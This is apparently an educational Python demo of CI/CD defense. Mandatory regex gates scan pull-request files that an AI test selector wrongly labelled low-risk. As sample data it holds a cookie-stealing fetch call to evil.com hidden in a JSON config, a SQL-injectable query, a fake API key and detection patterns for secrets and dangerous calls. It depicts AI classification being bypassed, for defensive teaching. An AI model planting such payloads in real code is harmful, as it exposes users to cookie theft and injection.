#!/usr/bin/env python3
"""
Step 4: Defense — Mandatory Security Gates

AI can optimize WHICH additional tests run, but certain security
gates ALWAYS run regardless of AI classification.

Author: AmitK
License: MIT License
Disclaimer: For educational and demonstration purposes only.
"""

import re

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'


# Mandatory gates that AI CANNOT skip
MANDATORY_GATES = [
    {
        'name': 'Secret Detection',
        'description': 'Scan ALL files for API keys, passwords, tokens',
        'checks': lambda content: bool(re.search(r'(sk-|api[_-]key|password|secret)\s*[:=]', content, re.IGNORECASE)),
    },
    {
        'name': 'File Content Analysis',
        'description': 'Check actual file CONTENT, not just extension',
        'checks': lambda content: bool(re.search(r'(import |def |class |function |eval\(|exec\()', content)),
    },
    {
        'name': 'Dangerous Pattern Scan',
        'description': 'Check for eval(), exec(), system(), subprocess in ANY file type',
        'checks': lambda content: bool(re.search(r'(eval\(|exec\(|os\.system|subprocess|fetch\()', content)),
    },
]

# The attacker's payloads
ATTACKER_FILES = [
    {
        'filename': 'docs/api_reference.md',
        'content': '# API Reference\n```python\ndb.execute(f"SELECT * FROM users WHERE id={user_input}")\n```',
        'ai_says': 'skip_tests (docs only)',
    },
    {
        'filename': 'config/service_settings.cfg',
        'content': 'import os\ndef get_config():\n    return {"db_url": os.environ["DATABASE_URL"]}',
        'ai_says': 'smoke_only (config file)',
    },
    {
        'filename': 'static/styles.css',
        'content': '/* api-key: sk-prod-abc123def456 */\nbody { color: #333; }',
        'ai_says': 'skip_tests (CSS file)',
    },
    {
        'filename': 'config/ui_display.json',
        'content': '{"theme": "dark", "on_load": "fetch(\'https://evil.com/steal?\'+document.cookie)"}',
        'ai_says': 'smoke_only (JSON config)',
    },
]


def run_mandatory_gates():
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}{GREEN}  🛡️  DEFENSE: Mandatory Security Gates{RESET}")
    print(f"{BOLD}{'='*60}{RESET}\n")

    print(f"  {CYAN}These gates ALWAYS run — AI cannot skip them.{RESET}\n")

    print(f"  {BOLD}Mandatory Gates:{RESET}")
    for i, gate in enumerate(MANDATORY_GATES, 1):
        print(f"    {i}. {gate['name']}: {gate['description']}")
    print()

    # Run gates on attacker's files
    print(f"  {BOLD}{'─'*55}{RESET}")
    print(f"  {BOLD}  Processing attacker's 'low-risk' files:{RESET}")
    print(f"  {BOLD}{'─'*55}{RESET}\n")

    caught = 0

    for file_info in ATTACKER_FILES:
        print(f"  File: {file_info['filename']}")
        print(f"  AI classification: {YELLOW}{file_info['ai_says']}{RESET}")

        file_caught = False
        for gate in MANDATORY_GATES:
            if gate['checks'](file_info['content']):
                print(f"  {RED}🚨 BLOCKED by: {gate['name']}{RESET}")
                file_caught = True
                break

        if file_caught:
            print(f"  Decision: {RED}❌ REJECTED — security gate failed{RESET}")
            caught += 1
        else:
            print(f"  Decision: {GREEN}✅ Passed all gates{RESET}")
        print()

    # Summary
    print(f"  {BOLD}{'═'*55}{RESET}")
    print(f"  {BOLD}{GREEN}  DEFENSE RESULTS:{RESET}")
    print(f"  {BOLD}{'═'*55}{RESET}")
    print(f"    AI alone:             {RED}0/4 caught (all bypassed){RESET}")
    print(f"    AI + Mandatory Gates: {GREEN}{caught}/4 caught{RESET}")
    print(f"    Vulnerabilities blocked: {GREEN}{caught}{RESET}")
    print(f"  {BOLD}{'═'*55}{RESET}")

    # Defense architecture
    print(f"\n  {BOLD}Secure CI/CD Architecture:{RESET}\n")
    print(f"    ┌─────────────────────────────────────────────────────┐")
    print(f"    │  PR Submitted                                       │")
    print(f"    │       ↓                                             │")
    print(f"    │  [MANDATORY] Secret detection       ← ALWAYS RUNS  │")
    print(f"    │  [MANDATORY] Content analysis       ← ALWAYS RUNS  │")
    print(f"    │  [MANDATORY] Dangerous pattern scan ← ALWAYS RUNS  │")
    print(f"    │       ↓                                             │")
    print(f"    │  [AI DECIDES] Additional tests:                     │")
    print(f"    │     • Unit tests (AI selects relevant subset)       │")
    print(f"    │     • Integration tests (if code changed)           │")
    print(f"    │     • Performance tests (if API changed)            │")
    print(f"    │       ↓                                             │")
    print(f"    │  [MANDATORY] Human review for any BLOCKED files     │")
    print(f"    │       ↓                                             │")
    print(f"    │  Deploy ✅                                           │")
    print(f"    └─────────────────────────────────────────────────────┘")

    print(f"\n  {BOLD}Key Principle:{RESET}")
    print(f"    AI can optimize WHICH tests run (performance).")
    print(f"    AI can NEVER skip security gates (safety).")
    print(f"    Separation: optimization vs. security decisions.")

    print(f"\n  {GREEN}✅ No vulnerability bypasses CI/CD regardless of AI classification.{RESET}\n")


if __name__ == "__main__":
    run_mandatory_gates()
